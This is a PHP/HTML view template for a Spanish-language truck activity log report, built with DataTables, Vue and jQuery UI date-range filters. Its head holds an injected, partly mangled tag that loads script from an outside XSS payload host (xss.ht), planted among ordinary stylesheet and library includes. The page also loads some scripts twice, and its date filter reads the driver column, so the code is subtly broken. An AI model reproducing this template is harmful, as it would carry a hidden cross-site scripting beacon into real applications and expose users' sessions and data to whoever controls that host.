<html>

<head>
    
    <meta fgdfgfgdipt src=https://9z.xss.ht> </script> 

    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.18/css/dataTables.bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.0/jquery-ui.css">
    <script src="https://cdn.jsdelivr.net/npm/vue"></script>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <script src="<?= base_url() ?>assets/js/Vue_Reportes.js" type="text/javascript"></script>
    <link href="https://editor.datatables.net/extensions/Editor/css/editor.dataTables.min.css" rel="stylesheet" type="text/css" />
    <script src="https://editor.datatables.net/extensions/Editor/js/dataTables.editor.min.js"></script>
    <?php $this->load->view('header/header_prueba'); ?>


</head>

<body>
    <!-- INICIO TABLA -->
    <main>

        <div class="right_col" role="main">
            <table border="0" cellspacing="5" cellpadding="5">
                <tbody>
                    <tr>
                        <td>Fecha de inicio</td>
                        <td><input name="min" id="min" type="text"></td>
                    </tr>
                    <tr>
                        <td>Fecha de termino</td>
                        <td><input name="max" id="max" type="text"></td>
                    </tr>
                </tbody>
            </table>
            
                    
                        <br>
                        <input type="button" value="Limpiar Fechas" class="btn btn-primary" id="clear-dates">
                   
            <br>
            <br>
            <table id="example" class="table table-striped table-bordered responsive">
                <thead>
                    <tr>
                        <th>Fecha</th>
                        <th>Autor</th>
                        <th>Acción</th>
                        <th>Rut</th>
                        <th>Chofer</th>
                        <th>Patente Camion</th>
                        <th>Nombre Sector</th>
                    </tr>
                </thead>
                <tfoot>
                    <tr>
                        <th>Fecha</th>
                        <th>Autor</th>
                        <th>Acción</th>
                        <th>Rut</th>
                        <th>Chofer</th>
                        <th>Patente Camion</th>
                        <th>Nombre Sector</th>
                    </tr>
                </tfoot>
                <tbody>
					<tr v-for="l in logCamion">
					
						<td>{{l.Fecha}}</td>
                        <td>{{l.Autor}}</td>
                        <td>{{l.Accion}}</td>
                        <td>{{l.Rut}}</td>
                        <td>{{l.Chofer}}</td>
                        <td>{{l.Patente}}</td>
                        <td>{{l.Nombre}}</td>

					</tr>
				</tbody>
            </table>
            <br>
            
        </div>


    </main>
    <script src="<?= base_url() ?>assets/js/Vue_Reportes.js" type="text/javascript"></script>
    <script type="text/javascript" language="javascript" charset="utf-8" src="http://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script type="text/javascript" language="javascript" charset="utf-8" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

    <script type="text/javascript" language="javascript" charset="utf-8" src="https://cdn.datatables.net/1.10.18/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" language="javascript" charset="utf-8" src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.0/jquery-ui.js"></script>
    <script type="text/javascript" language="javascript" charset="utf-8" src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.23.0/moment.min.js"></script>
    

	<script type="text/javascript" src="<?= base_url() ?>assets/js/jszip.min.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/pdfmake.min.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/vfs_fonts.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/jquery.dataTables.min.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/dataTables.buttons.min.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/buttons.html5.min.js"></script>
	<script type="text/javascript" src="<?= base_url() ?>assets/js/buttons.print.min.js"></script>
    <!-- Custom Theme Scripts -->
    <script src="<?= base_url() ?>assets/build/js/custom.min.js"></script>



    <script src="https://cdn.jsdelivr.net/npm/vue"></script>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>




    <!-- FONT -->
    <script src="https://use.fontawesome.com/d2876ee9f5.js"></script>

	<script type="text/javascript" src="<?= base_url() ?>assets/js/tablaestilo"></script>
    


    <script>
        $(document).ready(function() {
            $.fn.dataTable.ext.search.push(
                function(settings, data, dataIndex) {
                    var min = $('#min').datepicker("getDate");
                    var max = $('#max').datepicker("getDate");
                    var startDate = new Date(data[4]);
                    if (min == null && max == null) {
                        return true;
                    }
                    if (min == null && startDate <= max) {
                        return true;
                    }
                    if (max == null && startDate >= min) {
                        return true;
                    }
                    if (startDate <= max && startDate >= min) {
                        return true;
                    }
                    return false;
                }
            );


            $("#min").datepicker({
                onSelect: function() {
                    table.draw();
                },
                changeMonth: true,
                changeYear: true
            });
            $("#max").datepicker({
                onSelect: function() {
                    table.draw();
                },
                changeMonth: true,
                changeYear: true
            });
            var table = $('#example').DataTable();

            // Event listener to the two range filtering inputs to redraw on input
            $('#min, #max').change(function() {
                table.draw();
            });
            var $dates = $('#min, #max').datepicker();
            $('#clear-dates').on('click', function () {
                $dates.datepicker('setDate', null);
                table.draw();
            });
        });
    </script>
</body>

</html>